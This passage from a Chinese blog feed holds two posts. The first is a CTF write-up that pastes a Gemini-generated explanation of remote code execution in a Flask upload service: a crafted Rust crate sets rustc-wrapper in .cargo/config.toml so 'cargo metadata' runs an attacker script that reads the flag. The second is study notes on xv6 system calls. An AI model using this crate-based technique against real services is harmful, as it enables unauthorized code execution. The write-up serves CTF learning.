class="hljs-string">&quot;:&quot;</span> <span class="hljs-keyword">in</span> line:<br>            k, v = line.split(<span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-number">1</span>)<br>            meta[k.strip()] = v.strip()<br>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;metadata&quot;</span>: meta&#125;, <span class="hljs-number">200</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_node_project</span>(<span class="hljs-params">path: pathlib.Path</span>) -&gt; <span class="hljs-built_in">bool</span>:<br>    <span class="hljs-keyword">return</span> (path / <span class="hljs-string">&quot;package.json&quot;</span>).is_file()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">handle_node_project</span>(<span class="hljs-params">extract_dir: pathlib.Path</span>):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(extract_dir / <span class="hljs-string">&quot;package.json&quot;</span>, encoding=<span class="hljs-string">&quot;utf-8&quot;</span>) <span class="hljs-keyword">as</span> f:<br>            pkg = json.load(f)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;package.json parse failed&quot;</span>&#125;, <span class="hljs-number">400</span><br><br>    subset = &#123;<br>        k: pkg[k]<br>        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> (<span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-string">&quot;version&quot;</span>, <span class="hljs-string">&quot;description&quot;</span>, <span class="hljs-string">&quot;scripts&quot;</span>, <span class="hljs-string">&quot;dependencies&quot;</span>)<br>        <span class="hljs-keyword">if</span> k <span class="hljs-keyword">in</span> pkg<br>    &#125;<br>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;metadata&quot;</span>: subset&#125;, <span class="hljs-number">200</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_rust_crate</span>(<span class="hljs-params">path: pathlib.Path</span>) -&gt; <span class="hljs-built_in">bool</span>:<br>    <span class="hljs-keyword">return</span> (path / <span class="hljs-string">&quot;Cargo.toml&quot;</span>).is_file()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">handle_rust_crate</span>(<span class="hljs-params">extract_dir: pathlib.Path</span>):<br>    stdout, _stderr, code = run(<br>        [<span class="hljs-string">&quot;cargo&quot;</span>, <span class="hljs-string">&quot;metadata&quot;</span>, <span class="hljs-string">&quot;--locked&quot;</span>, <span class="hljs-string">&quot;--offline&quot;</span>, <span class="hljs-string">&quot;--format-version&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>],<br>        cwd=extract_dir,<br>    )<br><br>    <span class="hljs-keyword">if</span> code != <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">f&quot;Internal Server Error (exit code: <span class="hljs-subst">&#123;code&#125;</span>)&quot;</span>&#125;, <span class="hljs-number">500</span><br><br>    <span class="hljs-keyword">try</span>:<br>        meta = json.loads(stdout)<br>    <span class="hljs-keyword">except</span> json.JSONDecodeError:<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;Failed to parse JSON&quot;</span>&#125;, <span class="hljs-number">500</span><br><br>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;metadata&quot;</span>: meta&#125;, <span class="hljs-number">200</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">handle_image</span>(<span class="hljs-params">file_path: pathlib.Path</span>):<br>    stdout, _stderr, _ = run([<span class="hljs-string">&quot;exiftool&quot;</span>, <span class="hljs-string">&quot;-json&quot;</span>, <span class="hljs-built_in">str</span>(file_path)])<br>    <span class="hljs-keyword">try</span>:<br>        meta = json.loads(stdout <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;null&quot;</span>)<br>    <span class="hljs-keyword">except</span> json.JSONDecodeError:<br>        meta = <span class="hljs-string">&quot;No metadata found&quot;</span><br>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;metadata&quot;</span>: meta&#125;, <span class="hljs-number">200</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">handle_media</span>(<span class="hljs-params">file_path: pathlib.Path</span>):<br>    stdout, _stderr, code = run(<br>        [<br>            <span class="hljs-string">&quot;ffprobe&quot;</span>,<br>            <span class="hljs-string">&quot;-v&quot;</span>,<br>            <span class="hljs-string">&quot;quiet&quot;</span>,<br>            <span class="hljs-string">&quot;-print_format&quot;</span>,<br>            <span class="hljs-string">&quot;json&quot;</span>,<br>            <span class="hljs-string">&quot;-show_format&quot;</span>,<br>            <span class="hljs-string">&quot;-show_streams&quot;</span>,<br>            <span class="hljs-built_in">str</span>(file_path),<br>        ]<br>    )<br>    <span class="hljs-keyword">if</span> code != <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;ffprobe failed&quot;</span>&#125;, <span class="hljs-number">415</span><br><br>    <span class="hljs-keyword">try</span>:<br>        meta = json.loads(stdout <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;null&quot;</span>)<br>    <span class="hljs-keyword">except</span> json.JSONDecodeError:<br>        meta = &#123;<span class="hljs-string">&quot;raw&quot;</span>: stdout.strip()&#125;<br>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;metadata&quot;</span>: meta&#125;, <span class="hljs-number">200</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">save_and_probe</span>(<span class="hljs-params">upload</span>):<br>    workdir = TMP_PARENT / <span class="hljs-built_in">str</span>(uuid.uuid4())<br>    workdir.mkdir(parents=<span class="hljs-literal">True</span>, exist_ok=<span class="hljs-literal">False</span>)<br><br>    <span class="hljs-keyword">try</span>:<br>        fname = secure_filename(upload.filename) <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;upload.bin&quot;</span><br>        raw_path = workdir / fname<br>        raw_path.write_bytes(upload.read())<br><br>        mime = magic.from_file(<span class="hljs-built_in">str</span>(raw_path), mime=<span class="hljs-literal">True</span>)<br><br>        <span class="hljs-keyword">if</span> mime <span class="hljs-keyword">in</span> &#123;<br>            <span class="hljs-string">&quot;application/x-tar&quot;</span>,<br>            <span class="hljs-string">&quot;application/gzip&quot;</span>,<br>            <span class="hljs-string">&quot;application/x-bzip2&quot;</span>,<br>            <span class="hljs-string">&quot;application/zip&quot;</span>,<br>        &#125;:<br>            extract_dir = workdir / <span class="hljs-string">&quot;unpack&quot;</span><br>            extract_dir.mkdir()<br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-keyword">if</span> mime == <span class="hljs-string">&quot;application/zip&quot;</span>:<br>                    <span class="hljs-keyword">with</span> zipfile.ZipFile(raw_path) <span class="hljs-keyword">as</span> zf:<br>                        zf.extractall(extract_dir)<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-keyword">with</span> tarfile.<span class="hljs-built_in">open</span>(raw_path) <span class="hljs-keyword">as</span> tf:<br>                        tf.extractall(extract_dir)<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">f&quot;archive extraction failed: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>&#125;, <span class="hljs-number">400</span><br><br>            <span class="hljs-keyword">if</span> is_node_project(extract_dir):<br>                <span class="hljs-keyword">return</span> handle_node_project(extract_dir)<br><br>            <span class="hljs-keyword">if</span> is_rust_crate(extract_dir):<br>                <span class="hljs-keyword">return</span> handle_rust_crate(extract_dir)<br><br>            listing = <span class="hljs-built_in">sorted</span>(<br>                <span class="hljs-built_in">str</span>(p.relative_to(extract_dir)) <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> extract_dir.rglob(<span class="hljs-string">&quot;*&quot;</span>)<br>            )<br>            <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;listing&quot;</span>: listing&#125;, <span class="hljs-number">200</span><br><br>        <span class="hljs-keyword">if</span> mime.startswith(<span class="hljs-string">&quot;image/&quot;</span>):<br>            <span class="hljs-keyword">return</span> handle_image(raw_path)<br><br>        <span class="hljs-keyword">if</span> mime == <span class="hljs-string">&quot;application/pdf&quot;</span>:<br>            <span class="hljs-keyword">return</span> handle_pdf(raw_path)<br><br>        <span class="hljs-keyword">if</span> mime.startswith(<span class="hljs-string">&quot;audio/&quot;</span>) <span class="hljs-keyword">or</span> mime.startswith(<span class="hljs-string">&quot;video/&quot;</span>):<br>            <span class="hljs-keyword">return</span> handle_media(raw_path)<br><br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">f&quot;unsupported MIME: <span class="hljs-subst">&#123;mime&#125;</span>&quot;</span>&#125;, <span class="hljs-number">415</span><br><br>    <span class="hljs-keyword">finally</span>:<br>        shutil.rmtree(workdir, ignore_errors=<span class="hljs-literal">True</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/upload&quot;</span>, methods=[<span class="hljs-string">&quot;POST&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;file&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> request.files:<br>        abort(<span class="hljs-number">400</span>, <span class="hljs-string">&quot;multipart/form-data with field &#x27;file&#x27; required&quot;</span>)<br>    result, code = save_and_probe(request.files[<span class="hljs-string">&quot;file&quot;</span>])<br>    <span class="hljs-keyword">return</span> jsonify(result), code<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>, port=<span class="hljs-number">8000</span>)<br><br></code></pre></td></tr></table></figure><p>直接丢给 <code>gemini</code> 就出了：</p><p>好的，我们来分析这道 CTF 题目的代码并找出获取 flag 的方法。</p><p>简而言之，这段代码的漏洞在于处理 Rust Crate 压缩包时，可以通过在压缩包内构造恶意的 <code>.cargo/config.toml</code> 文件来指定一个在服务器上执行的脚本，从而实现远程代码执行（RCE）。</p><hr><h2 id="代码功能分析-Code-Functionality-Analysis"><a href="#代码功能分析-Code-Functionality-Analysis" class="headerlink" title="代码功能分析 (Code Functionality Analysis)"></a>代码功能分析 (Code Functionality Analysis)</h2><p>首先，我们来梳理一下这个 Flask 应用能处理哪些文件类型。核心逻辑在 <code>save_and_probe</code> 函数中，它通过 <code>python-magic</code> 库识别上传文件的 MIME 类型，然后分发给不同的处理函数：</p><ol><li><strong>压缩文件 (Archives)</strong>:<ul><li>MIME 类型: <code>application/x-tar</code>, <code>application/gzip</code>, <code>application/x-bzip2</code>, <code>application/zip</code></li><li>处理流程:<ul><li>解压文件到一个临时目录。</li><li>检查解压后的目录是否为 <strong>Node.js 项目</strong> (包含 <code>package.json</code>)，如果是，则调用 <code>handle_node_project</code> 解析元数据。</li><li>检查解压后的目录是否为 <strong>Rust Crate</strong> (包含 <code>Cargo.toml</code>)，如果是，则调用 <code>handle_rust_crate</code> 解析元数据。</li><li>如果都不是，就列出压缩包内的所有文件名。</li></ul></li></ul></li><li><strong>图片文件 (Images)</strong>:<ul><li>MIME 类型: <code>image/*</code></li><li>处理流程: 调用 <code>handle_image</code> 函数，使用 <code>exiftool</code> 提取图片的 EXIF 元数据。</li></ul></li><li><strong>PDF 文件</strong>:<ul><li>MIME 类型: <code>application/pdf</code></li><li>处理流程: 调用 <code>handle_pdf</code> 函数，使用 <code>pdfinfo</code> 提取 PDF 的元数据。</li></ul></li><li><strong>音视频文件 (Audio&#x2F;Video)</strong>:<ul><li>MIME 类型: <code>audio/*</code> 或 <code>video/*</code></li><li>处理流程: 调用 <code>handle_media</code> 函数，使用 <code>ffprobe</code> 提取媒体文件的元数据。</li></ul></li></ol><p>对于不支持的其他文件类型，服务器会返回 <code>415 Unsupported Media Type</code> 错误。</p><hr><h2 id="漏洞寻找-Vulnerability-Analysis"><a href="#漏洞寻找-Vulnerability-Analysis" class="headerlink" title="漏洞寻找 (Vulnerability Analysis)"></a>漏洞寻找 (Vulnerability Analysis)</h2><p>CTF 中，当看到程序使用 <code>subprocess.run</code> 或类似函数来调用外部命令行工具时，我们应高度警惕命令注入漏洞。我们来逐一排查：</p><ul><li><code>handle_pdf</code>: <code>run([&quot;pdfinfo&quot;, str(file_path)])</code></li><li><code>handle_image</code>: <code>run([&quot;exiftool&quot;, &quot;-json&quot;, str(file_path)])</code></li><li><code>handle_media</code>: <code>run([&quot;ffprobe&quot;, ..., str(file_path)])</code></li></ul><p>在上面这三个调用中，用户可控的输入 <code>file_path</code> 是作为命令行参数列表中的一个独立元素传递的。这是使用 <code>subprocess</code> 的安全方式，可以有效防止简单的命令注入（比如文件名叫 <code>my_file; ls -la</code>）。虽然可能存在参数注入漏洞（比如文件名叫 <code>-o pwned.txt</code>），但 <code>werkzeug.utils.secure_filename</code> 函数会移除文件名前的 <code>-</code>，从而缓解了这类攻击。所以这几处看起来是安全的。</p><ul><li><code>handle_rust_crate</code>: <code>run([&quot;cargo&quot;, &quot;metadata&quot;, ...], cwd=extract_dir)</code></li></ul><p>这个调用就非常可疑了。它没有将用户输入直接作为命令参数，而是<strong>在用户上传并解压后的目录 (<code>extract_dir</code>) 中执行 <code>cargo metadata</code> 命令</strong>。这意味着我们可以完全控制 <code>cargo</code> 命令执行时的环境，特别是其配置文件。</p><p>Cargo 在执行时会读取项目目录下的 <code>.cargo/config.toml</code> 文件。通过这个配置文件，我们可以修改 Cargo 的行为。其中一个极其危险的配置项是 <strong><code>build.rustc-wrapper</code></strong>。</p><p><strong><code>rustc-wrapper</code></strong>: 这个配置项允许你指定一个“包装器”程序。当 Cargo 需要调用 Rust 编译器 (<code>rustc</code>) 时，它不会直接运行 <code>rustc</code>，而是会去运行你指定的那个包装器程序，并将 <code>rustc</code> 和所有编译参数作为包装器程序的参数。</p><p><code>cargo metadata</code> 命令为了获取项目的元数据，需要调用 <code>rustc</code> 来分析源码。因此，如果我们上传一个包含特制 <code>.cargo/config.toml</code> 文件的 Rust Crate 压缩包，就可以让服务器在调用 <code>cargo metadata</code> 时执行我们指定的任意脚本。这就是本次挑战的突破口！🔓</p><hr><h2 id="漏洞利用步骤-Exploitation-Steps"><a href="#漏洞利用步骤-Exploitation-Steps" class="headerlink" title="漏洞利用步骤 (Exploitation Steps)"></a>漏洞利用步骤 (Exploitation Steps)</h2><p>我们的目标是创建一个恶意的 Rust Crate 压缩包。当服务器解压并对其运行 <code>cargo metadata</code> 时，会执行我们预设的命令来读取 flag。</p><p>假设 flag 文件位于 <code>/flag.txt</code>。</p><h3 id="1-创建恶意-Rust-项目结构"><a href="#1-创建恶意-Rust-项目结构" class="headerlink" title="1. 创建恶意 Rust 项目结构"></a>1. 创建恶意 Rust 项目结构</h3><p>首先，在你的本地机器上创建如下的文件和目录结构：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus">exploit-crate/<br>├── .cargo/<br>│   └── config<span class="hljs-selector-class">.toml</span><br>├── <span class="hljs-attribute">src</span>/<br>│   └── lib<span class="hljs-selector-class">.rs</span><br>├── get_flag<span class="hljs-selector-class">.sh</span><br>└── Cargo.toml`<br></code></pre></td></tr></table></figure><h3 id="2-编写各个文件内容"><a href="#2-编写各个文件内容" class="headerlink" title="2. 编写各个文件内容"></a>2. 编写各个文件内容</h3><p><strong>a. <code>Cargo.toml</code> (项目描述文件)</strong></p><p>这个文件只需要符合基本格式即可，内容不重要。</p><p>Ini, TOML</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">[package]<br>name = <span class="hljs-string">&quot;exploit&quot;</span><br>version = <span class="hljs-string">&quot;0.1.0&quot;</span><br>edition = <span class="hljs-string">&quot;2021&quot;</span>`<br></code></pre></td></tr></table></figure><p><strong>b. <code>src/lib.rs</code> (源码文件)</strong></p><p>这个文件同样只需要存在即可，内容为空都行。</p><p>Rust</p><p><strong>c. <code>get_flag.sh</code> (我们的恶意脚本)</strong></p><p>这是我们想在服务器上执行的脚本。它会读取 flag 文件，并将内容输出到标准输出。Cargo 会捕获这个输出，虽然我们可能在最终的 JSON 响应中看不到它，但命令确实执行了。更稳妥的办法是将 flag 发送到我们自己的服务器上（反向 shell 或 webhook）。这里为了简单演示，我们假设 flag 会被包含在 <code>cargo</code> 的错误输出中返回。</p><p>Bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br><span class="hljs-built_in">cat</span> /flag.tx<br></code></pre></td></tr></table></figure><p><strong>重要</strong>: 创建完脚本后，一定要给它添加可执行权限！</p><p>Bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> +x exploit-crate/get_flag.sh<br></code></pre></td></tr></table></figure><p><strong>d. <code>.cargo/config.toml</code> (核心配置文件)</strong></p><p>这是整个攻击的核心。我们在这里指定 <code>get_flag.sh</code> 作为 <code>rustc-wrapper</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">[build]<br><span class="hljs-comment"># We use a relative path here. When cargo runs, it will be in the &#x27;exploit-crate&#x27; directory.</span><br>rustc-wrapper = <span class="hljs-string">&quot;./get_flag.sh&quot;</span><br></code></pre></td></tr></table></figure><h3 id="3-打包并上传"><a href="#3-打包并上传" class="headerlink" title="3. 打包并上传"></a>3. 打包并上传</h3><p>现在，将整个 <code>exploit-crate</code> 目录压缩成一个 <code>.zip</code> 或 <code>.tar.gz</code> 文件。</p><p>Bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 创建 .tar.gz 压缩包</span><br>tar -czvf exploit.tar.gz exploit-crate/<br><br><span class="hljs-comment"># 或者创建 .zip 压缩包</span><br>zip -r exploit.zip exploit-crate/<br></code></pre></td></tr></table></figure><p>最后，将生成的 <code>exploit.tar.gz</code> 或 <code>exploit.zip</code> 文件上传到题目的网页上。</p><h3 id="4-获取-Flag"><a href="#4-获取-Flag" class="headerlink" title="4. 获取 Flag"></a>4. 获取 Flag</h3><p>当服务器收到文件后：</p><ol><li>它会检测到这是一个压缩包并解压。</li><li>它会发现解压后的目录包含 <code>Cargo.toml</code>，于是调用 <code>handle_rust_crate</code>。</li><li><code>handle_rust_crate</code> 在解压目录中执行 <code>cargo metadata</code>。</li><li>Cargo 读取 <code>.cargo/config.toml</code> 文件，发现设置了 <code>rustc-wrapper</code>。</li><li>当 Cargo 尝试调用 <code>rustc</code> 时，它实际上会执行 <code>./get_flag.sh</code>。</li><li><code>./get_flag.sh</code> 脚本执行 <code>cat /flag.txt</code>。</li><li><code>cargo metadata</code> 命令可能会因为 wrapper 的异常输出而失败并退出，但我们的脚本已经成功执行了。服务器可能会返回一个 500 错误，但在错误信息中，可能会包含 <code>cargo</code> 的标准错误输出，其中就可能包含了 flag 的内容。</li></ol><p>通过以上步骤，你就可以成功执行命令并拿到 flag 了。🚩</p><p>本次 <code>CTF</code> 比赛完成的相关内容就如上了。</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>pwn</tag>
      
      <tag>rust</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MIT_OS_Chp1</title>
    <link href="/2025/09/11/MIT-OS-Chp1/"/>
    <url>/2025/09/11/MIT-OS-Chp1/</url>
    
    <content type="html"><![CDATA[<h1 id="OS-interface"><a href="#OS-interface" class="headerlink" title="OS interface"></a>OS interface</h1><p><code>xv6</code>是一个 <code>Unix</code> 操作系统，分为用户空间和内核空间。当一个进程需要发起一个kernel service的时候，就执行一个系统i调用，是一个OS inerface。</p><p><code>shell</code> 和一些其他的用户态进程均运行在用户态空间。 <code>kernel</code> 使用CPU提供的硬件保护机制，来确保每一个在用户空间执行的进程都只能接触到它自己的内从空间。内核拥有着需要向这些硬件保护许可的执行权限，而用户没有这些权限。</p><span id="more"></span><h2 id="Processes-and-memory"><a href="#Processes-and-memory" class="headerlink" title="Processes and memory"></a>Processes and memory</h2><p>xv6下的每一个进程都含有用户空间内存（包括指令，数据和栈空间）和独属于内核的进程状态信息。Xv6分时进程：将等待执行的进程透明的分给空闲的CPU。进程不执行的时候，xv6系统会讲CPU的寄存器信息保存起来，并且在下一次执行的时候重新恢复。</p><p>内核对每一个进程都有一个相关的进程描述符（PID）</p><p>一个进程可以通过 <code>fork</code> 创建一个新的进程（系统调用）， <code>fork</code>会给新的进程一个完全相同的内存内容（包括指令和数据），对于新进程和原本的进程都会有返回值。返回给原本进程新进程的PID，新进程会返回0，可以视作父进程和子进程。</p><p><code>exit</code> 系统调用会让当前进程停止执行，并且释放内存，打开的文件等资源。 <code>exit</code> 需要一个整数参数，0表示正常退出，1表示异常退出。</p><p><code>wait</code> 系统调用会返回当前进程的子进程的PID，并且会复制子进程 <code>exit</code> 的状态信息给等待者。如果调用者的所有子进程都没有离开，那么 <code>wait</code> 将会等待知道有子进程退出。如果当前进程没有子进程，就会立马返回-1。</p><p>尽管父子进程有相同的内存和寄存器，但实际上运行在不同的内存空间，使用不同的寄存器。其中一个改变并不会影响另一个。</p><p><code>exec</code>系统调用将会用一个从文件系统中的文件加载来的全新的内存代替当前进程的内存。这个文件必须有特殊的文件格式，开始于一个指令，并且只包含指令和数据信息。这个系统调用不再会返回原先的进程，从文件中加载的指令将会根据ELF头中的 <code>entry point</code> 来开始执行。 <code>exec</code>需要两个参数：包含可执行部分的文件名和字符串数组。</p><p>xv6 shell 使用上述调用来代表用户运行程序。shell 的主要结构很简单；参见 main (user&#x2F;sh.c:145)。主循环使用 getcmd 读取用户的一行输入。然后调用 fork 函数，创建 shell 进程的副本。父进程调用 wait 函数，而子进程则运行命令。例如，如果用户在 shell 中输入了“echo hello”，则 runcmd 函数将被调用，并以“echo hello”作为参数。runcmd (user&#x2F;sh.c:58) 运行实际命令。对于“echo hello”，它将调用 exec (user&#x2F;sh.c:78)。如果 exec 执行成功，则子进程将执行 echo 中的指令，而不是 runcmd 中的指令。在某个时刻，echo 会调用 exit 函数，这将导致父进程从 main (user&#x2F;sh.c:145) 中的 wait 函数返回。</p><p>您可能想知道为什么 fork 和 exec 函数不合并在一个调用中；我们稍后会看到，shell 在其 I&#x2F;O 重定向实现中利用了这种分离。为了避免创建重复进程然后立即替换（使用 exec）带来的浪费，操作系统内核针对此用例优化了 fork 的实现，并使用了虚拟内存技术，例如写时复制（参见 4.6 节）。</p><p>xv6会隐性的申请大多数用户内存。比如： <code>fork</code> 子进程会复制父进程的memory， <code>exec</code> 会allocate足够的内存来放可执行文件。一些进程会申请很多运行时内存。</p><h2 id="I-O-和文件描述符"><a href="#I-O-和文件描述符" class="headerlink" title="I&#x2F;O 和文件描述符"></a>I&#x2F;O 和文件描述符</h2><p><code>fd</code> 是一个内核管理的小型整数，一个进程可以从其中读&#x2F;写。一个进程可以通过打开一个文件，字典，设备或者创建一个管道来得到一个文件描述符。文件描述符接口和其他文件，管道以及设备是不同的，这让他们看起来像一串字节流。 I&#x2F;O指的是input&#x2F;output。</p><p>内核使用文件描述符作为每个进程表的index，所以每个进程都有一个私有的文件描述符集合。0 as standard input，and 1 as standard output，2 as standard error。</p><p>文件描述符的出现使得 <code>cat</code> 的实现变得非常的简单。因为 <code>cat</code> 并没有办法区分是从文件，终端还是管道中读取。</p><p><code>close</code> 系统调用会释放一个文件描述符，使得他将来能够被 <code>open, pip, dup</code> 给重新使用。文件描述符的分配总是从当前未使用的最低数字开始。</p><p><code>fork</code> 会复制父进程的 <code>fd table</code> ，而 <code>exec</code> 会代替父进程的内存，但是会保留 <code>fd table</code> 。这个过程中，父子进程所有的 <code>fd table</code> 都是独立的。虽然他们共享文件描述符表，这两个表是独立的。但是他们共享同一个偏移。得益于 <code>wait</code> 系统调用的实现，使得父子进程可以先后写入内容。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span>(fork() == <span class="hljs-number">0</span>)&#123;<br>write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;hello &quot;</span>, <span class="hljs-number">6</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;world\n&quot;</span>, <span class="hljs-number">6</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>上述代码可以成功打印出 <code>hello world</code> 到终端。</p><p><code>dup</code> 系统调用可以复制一个已有的文件描述符指向同一个I&#x2F;O设备。这两个文件描述符拥有同样的文件偏移，就像 <code>fork</code> 的两个子进程共享文件描述符一样。</p><p>example:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> file1 file2 &gt; tmp1 2&gt;&amp;1<br></code></pre></td></tr></table></figure><p>上面这条命令会将 <code>file1</code> 和 <code>file2</code> 的信息列出，原本标准output到终端，改为标准输出到文件tmp1，然后重定向 fd:2 → fd:1，即标准错误2也重定向到标准输出1，然后输出到tmp1文件中。</p><p>所以将文件的标准输出以及错误全部都写入 <code>tmp1</code> 文件中。</p><h2 id="Pipes"><a href="#Pipes" class="headerlink" title="Pipes"></a>Pipes</h2><p><code>pipe</code> 是内核暴露给进程的一小块缓冲区，以成对的方式出现，一个用来读，一个用来写。写数据到一个管道的一端，使得数据能够从管道的另一端进行读。 <code>pipe</code> 给进程间交互提供了一个方式。</p><p><code>pipe[0]</code> 是读端， <code>pipe[1]</code> 是写端。如果没有字符写入， <code>pipe</code> 会一直等待直到有数据被写入，或者所有指向写端的文件描述符被关闭。</p><p><code>shell</code> 中的管道符 <code>|</code> 会同时创建两个子进程，左边的子进程输出作为 <code>pipe</code> 的写端，右边子进程作为 <code>pipe</code> 的读端。这两个子进程是同时进行的，比如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sleep</span>(5) | <span class="hljs-built_in">echo</span> hi<br></code></pre></td></tr></table></figure><p>上述命令会立刻输出 <code>hi</code>，而不会等待。</p><h2 id="File-system"><a href="#File-system" class="headerlink" title="File system"></a>File system</h2><p>xv6的文件系统提供了数据文件，包含不可终端的字节数组和目录，这个目录包含数据文件的文件名和其他目录名，整个目录形成了一棵树。</p><p><code>mkdir</code> 创建一个新的数据文件, <code>mknod</code>创建一个新的设备文件。 <code>mknod</code> 创建了一个属于设备的特殊文件，和设备文件相关的是主设备号和次设备号，他们唯一的标识的内核设备。</p><p>文件的名字和文件本身是不同的。一个 <code>inode</code> 唯一的标识了一个实际的文件，包含这个文件的类型，长度，在硬盘中的位置以及有多少个 <code>link</code> 与它相关。一个实际的文件可以用多个 <code>link</code>  来进行链接。</p><p>The fstat system call retrieves information from the inode that a file descriptor refers to. It<br>fills in a struct stat, defined in stat.h (kernel&#x2F;stat.h) as:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> T_DIR 1 <span class="hljs-comment">// Directory</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> T_FILE 2 <span class="hljs-comment">// File</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> T_DEVICE 3 <span class="hljs-comment">// Device</span></span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> &#123;</span><br><span class="hljs-type">int</span> dev; <span class="hljs-comment">// File system’s disk device</span><br>uint ino; <span class="hljs-comment">// Inode number</span><br><span class="hljs-type">short</span> type; <span class="hljs-comment">// Type of file</span><br><span class="hljs-type">short</span> nlink; <span class="hljs-comment">// Number of links to file</span><br>uint64 size; <span class="hljs-comment">// Size of file in bytes</span><br>&#125;;<br></code></pre></td></tr></table></figure><p><code>link</code> system call会创造一个新的文件名字来指向一个实际的文件（也可以是一个实际文件的link）</p><p>对应的还有 <code>unlink</code> system 